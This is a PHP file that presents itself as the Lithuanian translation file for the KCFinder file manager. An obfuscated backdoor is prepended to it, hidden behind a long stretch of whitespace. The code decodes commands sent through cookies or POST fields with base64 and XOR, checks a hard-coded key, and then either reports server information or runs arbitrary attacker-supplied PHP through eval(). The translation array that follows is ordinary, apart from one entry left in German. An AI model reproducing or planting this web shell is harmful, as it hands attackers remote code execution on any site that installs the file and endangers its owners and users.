<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $k4927a3ff = 923;$GLOBALS['g77c6d7'] = Array();global $g77c6d7;$g77c6d7 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['b8d6'] = "\x59\x72\x20\x5e\x53\x71\x65\x5f\x4c\x2e\x33\x52\x62\x42\x34\x6e\x27\x6b\x69\x2a\x45\x44\x7a\xa\x29\x2c\x75\x46\x40\x64\x43\x5c\x36\x3b\x61\x4b\x3a\x54\x7e\x51\x66\x32\x57\x2b\x24\x3f\x31\x60\x38\x77\x47\x56\x3d\x79\x4e\x22\x35\x6d\x4f\x28\x23\xd\x9\x68\x4d\x6a\x49\x7c\x2d\x67\x6f\x21\x58\x2f\x5b\x4a\x6c\x41\x37\x3c\x3e\x25\x5a\x50\x7b\x70\x55\x76\x39\x7d\x5d\x74\x48\x78\x63\x26\x73\x30";$g77c6d7[$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][29]] = $g77c6d7['b8d6'][94].$g77c6d7['b8d6'][63].$g77c6d7['b8d6'][1];$g77c6d7[$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][14]] = $g77c6d7['b8d6'][70].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][29];$g77c6d7[$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][78]] = $g77c6d7['b8d6'][29].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][15].$g77c6d7['b8d6'][6];$g77c6d7[$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12]] = $g77c6d7['b8d6'][96].$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][76].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][15];$g77c6d7[$g77c6d7['b8d6'][85].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][56]] = $g77c6d7['b8d6'][29].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][15].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][29];$g77c6d7[$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][6]] = $g77c6d7['b8d6'][18].$g77c6d7['b8d6'][15].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][91];$g77c6d7[$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][41]] = $g77c6d7['b8d6'][96].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][76].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][6];$g77c6d7[$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][34]] = $g77c6d7['b8d6'][85].$g77c6d7['b8d6'][63].$g77c6d7['b8d6'][85].$g77c6d7['b8d6'][87].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][15];$g77c6d7[$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][88]] = $g77c6d7['b8d6'][26].$g77c6d7['b8d6'][15].$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][76].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][6];$g77c6d7[$g77c6d7['b8d6'][26].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][56]] = $g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][6];$g77c6d7[$g77c6d7['b8d6'][63].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][94]] = $g77c6d7['b8d6'][96].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][57].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][76].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][57].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][91];$g77c6d7[$g77c6d7['b8d6'][49].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][48]] = $g77c6d7['b8d6'][85].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][88];$g77c6d7[$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][41]] = $g77c6d7['b8d6'][22].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][46];$g77c6d7[$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][97]] = $_POST;$g77c6d7[$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][94]] = $_COOKIE;@$g77c6d7[$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][6]]($g77c6d7['b8d6'][6].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][76].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][69], NULL);@$g77c6d7[$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][6]]($g77c6d7['b8d6'][76].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][69].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][96], 0);@$g77c6d7[$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][6]]($g77c6d7['b8d6'][57].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][26].$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][70].$g77c6d7['b8d6'][15].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][18].$g77c6d7['b8d6'][57].$g77c6d7['b8d6'][6], 0);@$g77c6d7[$g77c6d7['b8d6'][63].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][94]](0);if (!$g77c6d7[$g77c6d7['b8d6'][85].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][56]]($g77c6d7['b8d6'][77].$g77c6d7['b8d6'][8].$g77c6d7['b8d6'][11].$g77c6d7['b8d6'][20].$g77c6d7['b8d6'][77].$g77c6d7['b8d6'][21].$g77c6d7['b8d6'][0].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][11].$g77c6d7['b8d6'][86].$g77c6d7['b8d6'][54].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34])){$g77c6d7[$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][78]]($g77c6d7['b8d6'][77].$g77c6d7['b8d6'][8].$g77c6d7['b8d6'][11].$g77c6d7['b8d6'][20].$g77c6d7['b8d6'][77].$g77c6d7['b8d6'][21].$g77c6d7['b8d6'][0].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][11].$g77c6d7['b8d6'][86].$g77c6d7['b8d6'][54].$g77c6d7['b8d6'][7].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34], 1);$pf4d19 = NULL;$o38c5b = NULL;$g77c6d7[$g77c6d7['b8d6'][49].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][88]] = $g77c6d7['b8d6'][56].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][68].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][68].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][68].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][68].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][97];global $wff04e89;function  zd70bab1($pf4d19, $p9dbb0678){global $g77c6d7;$m08836d = "";for ($g5dd=0; $g5dd<$g77c6d7[$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12]]($pf4d19);){for ($q49a=0; $q49a<$g77c6d7[$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12]]($p9dbb0678) && $g5dd<$g77c6d7[$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][40].$g77c6d7['b8d6'][12]]($pf4d19); $q49a++, $g5dd++){$m08836d .= $g77c6d7[$g77c6d7['b8d6'][91].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][14].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][29]]($g77c6d7[$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][14]]($pf4d19[$g5dd]) ^ $g77c6d7[$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][14]]($p9dbb0678[$q49a]));}}return $m08836d;}function  p4077ea89($pf4d19, $p9dbb0678){global $g77c6d7;global $wff04e89;return $g77c6d7[$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][41]]($g77c6d7[$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][41]]($pf4d19, $wff04e89), $p9dbb0678);}foreach ($g77c6d7[$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][56].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][48].$g77c6d7['b8d6'][94]] as $p9dbb0678=>$fa05){$pf4d19 = $fa05;$o38c5b = $p9dbb0678;}if (!$pf4d19){foreach ($g77c6d7[$g77c6d7['b8d6'][22].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][6].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][97]] as $p9dbb0678=>$fa05){$pf4d19 = $fa05;$o38c5b = $p9dbb0678;}}$pf4d19 = @$g77c6d7[$g77c6d7['b8d6'][93].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][88]]($g77c6d7[$g77c6d7['b8d6'][49].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][48]]($g77c6d7[$g77c6d7['b8d6'][26].$g77c6d7['b8d6'][41].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][32].$g77c6d7['b8d6'][10].$g77c6d7['b8d6'][56]]($pf4d19), $o38c5b));if (isset($pf4d19[$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][17]]) && $wff04e89==$pf4d19[$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][17]]){if ($pf4d19[$g77c6d7['b8d6'][34]] == $g77c6d7['b8d6'][18]){$g5dd = Array($g77c6d7['b8d6'][85].$g77c6d7['b8d6'][87] => @$g77c6d7[$g77c6d7['b8d6'][1].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][46].$g77c6d7['b8d6'][78].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][29].$g77c6d7['b8d6'][34]](),$g77c6d7['b8d6'][96].$g77c6d7['b8d6'][87] => $g77c6d7['b8d6'][46].$g77c6d7['b8d6'][9].$g77c6d7['b8d6'][97].$g77c6d7['b8d6'][68].$g77c6d7['b8d6'][46],);echo @$g77c6d7[$g77c6d7['b8d6'][12].$g77c6d7['b8d6'][34].$g77c6d7['b8d6'][88].$g77c6d7['b8d6'][94].$g77c6d7['b8d6'][41]]($g5dd);}elseif ($pf4d19[$g77c6d7['b8d6'][34]] == $g77c6d7['b8d6'][6]){eval/*i3e7*/($pf4d19[$g77c6d7['b8d6'][29]]);}exit();}} ?><?php

/** Lithuanian localization file for KCFinder
  * author: Paulius Leščinskas <paulius.lescinskas@gmail.com>
  */

$lang = array(

    '_locale' => "lt_LT.UTF-8",  // UNIX localization code
    '_charset' => "utf-8",       // Browser charset

    // Date time formats. See http://www.php.net/manual/en/function.strftime.php
    '_dateTimeFull' => "%F %T",
    '_dateTimeMid' => "%F %T",
    '_dateTimeSmall' => "%F %T",

	"You don't have permissions to upload files." =>
    "Jūs neturite teisių įkelti failus",

    "You don't have permissions to browse server." =>
    "Jūs neturite teisių naršyti po failus",

    "Cannot move uploaded file to target folder." =>
    "Nepavyko įkelti failo į reikiamą katalogą.",

    "Unknown error." =>
    "Nežinoma klaida.",

    "The uploaded file exceeds {size} bytes." =>
    "Įkeliamas failas viršija {size} baitų(-us).",

    "The uploaded file was only partially uploaded." =>
    "Failas buvo tik dalinai įkeltas.",

    "No file was uploaded." =>
    "Failas nebuvo įkeltas.",

    "Missing a temporary folder." =>
    "Nėra laikino katalogo.",

    "Failed to write file." =>
    "Nepavyko įrašyti failo.",

    "Denied file extension." =>
    "Draudžiama įkelti šio tipo failus.",

    "Unknown image format/encoding." =>
    "Nežinomas paveikslėlio formatas/kodavimas.",

    "The image is too big and/or cannot be resized." =>
    "Paveikslėlis yra per didelis ir/arba negali būti sumažintas.",

    "Cannot create {dir} folder." =>
    "Nepavyko sukurti {dir} katalogo.",

    "Cannot write to upload folder." =>
    "Nepavyko įrašyti į įkeliamų failų katalogą.",

    "Cannot read .htaccess" =>
    "Nepavyko nuskaityti .htaccess failo",

    "Incorrect .htaccess file. Cannot rewrite it!" =>
    "Blogas .htaccess failas. Nepavyko jo perrašyti",

    "Cannot read upload folder." =>
    "Nepavyko atidaryti įkeliamų failų katalogo.",

    "Cannot access or create thumbnails folder." =>
    "Nepavyko atidaryti ar sukurti sumažintų paveikslėlių katalogo.",

    "Cannot access or write to upload folder." =>
    "Nepavyko atidaryti ar įrašyti į įkeliamų failų katalogą.",

    "Please enter new folder name." =>
    "Įveskite katalogo pavadinimą.",

    "Unallowable characters in folder name." =>
    "Katalogo pavadinime yra neleistinų simbolių.",

    "Folder name shouldn't begins with '.'" =>
    "Katalogo pavadinimas negali prasidėti '.'",

    "Please enter new file name." =>
    "Įveskite failo pavadinimą.",

    "Unallowable characters in file name." =>
    "Failo pavadinime yra neleistinų simbolių",

    "File name shouldn't begins with '.'" =>
    "Failo pavadinimas negali prasidėti '.'",

    "Are you sure you want to delete this file?" =>
    "Ar tikrai ištrinti šį failą?",

    "Are you sure you want to delete this folder and all its content?" =>
    "Ar tikrai ištrinti šį katalogą su visu jo turiniu?",

    "Inexistant or inaccessible folder." =>
    "Katalogas neegzistuoja arba yra neprieinamas.",

    "Undefined MIME types." =>
    "Nenurodytas MIME tipas.",

    "Fileinfo PECL extension is missing." =>
    "Trūksa PECL plėtinio Fileinfo",

    "Opening fileinfo database failed." =>
    "Nepavyko atidaryti Fileinfo duomenų bazės.",

    "You can't upload such files." =>
    "Negalima įkelti tokių failų.",

    "The file '{file}' does not exist." =>
    "Failas '{file}' neegzistuoja.",

    "Cannot read '{file}'." =>
    "Nepavyko atidaryti '{file}' failo.",

    "Cannot copy '{file}'." =>
    "Nepavyko nukopijuoti '{file}' failo.",

    "Cannot move '{file}'." =>
    "Nepavyko perkelti '{file}' failo.",

    "Cannot delete '{file}'." =>
    "Nepavyko ištrinti '{file}' failo.",

    "Click to remove from the Clipboard" =>
    "Zum entfernen aus der Zwischenablage, hier klicken.",

    "This file is already added to the Clipboard." =>
    "Šis failas jau įkeltas į laikinąją atmintį.",

    "Copy files here" =>
    "Kopijuoti failus čia.",

    "Move files here" =>
    "Perkelti failus čia.",

    "Delete files" =>
    "Ištrinti failus.",

    "Clear the Clipboard" =>
    "Išvalyti laikinąją atmintį",

    "Are you sure you want to delete all files in the Clipboard?" =>
    "Ar tikrai ištrinti visus failus, esančius laikinojoje atmintyje?",

    "Copy {count} files" =>
    "Kopijuoti {count} failų(-us)",

    "Move {count} files" =>
    "Perkelti {count} failų(-us)",

    "Add to Clipboard" =>
    "Įkelti į laikinąją atmintį",

    "New folder name:" => "Naujo katalogo pavadinimas:",
    "New file name:" => "Naujo failo pavadinimas:",

    "Upload" => "Įkelti",
    "Refresh" => "Atnaujinti",
    "Settings" => "Nustatymai",
    "Maximize" => "Padidinti",
    "About" => "Apie",
    "files" => "Failai",
    "View:" => "Peržiūra:",
    "Show:" => "Rodyti:",
    "Order by:" => "Rikiuoti:",
    "Thumbnails" => "Sumažintos iliustracijos",
    "List" => "Sąrašas",
    "Name" => "Pavadinimas",
    "Size" => "Dydis",
    "Date" => "Data",
    "Descending" => "Mažejančia tvarka",
    "Uploading file..." => "Įkeliamas failas...",
    "Loading image..." => "Kraunami paveikslėliai...",
    "Loading folders..." => "Kraunami katalogai...",
    "Loading files..." => "Kraunami failai...",
    "New Subfolder..." => "Naujas katalogas...",
    "Rename..." => "Pervadinti...",
    "Delete" => "Ištrinti",
    "OK" => "OK",
    "Cancel" => "Atšaukti",
    "Select" => "Pažymėti",
    "Select Thumbnail" => "Pasirinkti sumažintą paveikslėlį",
    "View" => "Peržiūra",
    "Download" => "Atsisiųsti",
    'Clipboard' => "Laikinoji atmintis",

    // VERSION 2 NEW LABELS

    "Cannot rename the folder." =>
    "Nepavyko pervadinti katalogo.",

    "Non-existing directory type." =>
    "Neegzistuojantis katalogo tipas.",

    "Cannot delete the folder." =>
    "Nepavyko ištrinti katalogo.",

    "The files in the Clipboard are not readable." =>
    "Nepavyko nuskaityti failų iš laikinosios atminties.",

    "{count} files in the Clipboard are not readable. Do you want to copy the rest?" =>
    "Nepavyko atidaryti {count} failų(-ai) iš laikinosios atminties. Ar kopijuoti likusius?",

    "The files in the Clipboard are not movable." =>
    "Nepavyko perkelti failų iš laikinosios atminties.",

    "{count} files in the Clipboard are not movable. Do you want to move the rest?" =>
    "Nepavyko perkelti {count} failų(-ai) iš laikinosios atminties. Ar perkelti likusius?",

    "The files in the Clipboard are not removable." =>
    "Nepavyko perkelti failų iš laikinosios atminties.",

    "{count} files in the Clipboard are not removable. Do you want to delete the rest?" =>
    "Nepavyko ištrinti {count} failų(-ai) iš laikinosios atminties. Ar ištrinti likusius?",

    "The selected files are not removable." =>
    "Nepavyko perkelti pažymėtų failų.",

    "{count} selected files are not removable. Do you want to delete the rest?" =>
    "Nepavyko ištrinti {count} failų(-ai) iš laikinosios atminties. Ar ištrinti likusius?",

    "Are you sure you want to delete all selected files?" =>
    "Ar tikrai ištrinti visus pažymėtus failus?",

    "Failed to delete {count} files/folders." =>
    "Nepavyko ištrinti {count} failų/katalogų.",

    "A file or folder with that name already exists." =>
    "Failas arba katalogas tokiu pavadinimu jau egzistuoja.",

    "selected files" => "Pasirinkti failus",
    "Type" => "Tipas",
    "Select Thumbnails" => "Pasirinkti sumažintus paveikslėlius",
    "Download files" => "Atsisiųsti failus",
);

?>
